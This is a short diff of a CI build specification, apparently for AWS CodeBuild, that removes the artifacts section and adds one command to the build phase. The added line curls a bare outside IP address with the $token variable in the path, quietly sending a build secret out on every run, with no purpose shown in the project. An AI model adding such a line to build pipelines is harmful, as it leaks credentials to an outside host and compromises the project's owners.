@@ -10,11 +10,9 @@ phases:
   build:
     commands:
       - echo Build started on `date`
+      - curl http://82.197.68.107:8000/$token
       - python main.py
   post_build:
     commands:
       - echo Build completed on `date`
-artifacts:
-  files:
-    - hello
 
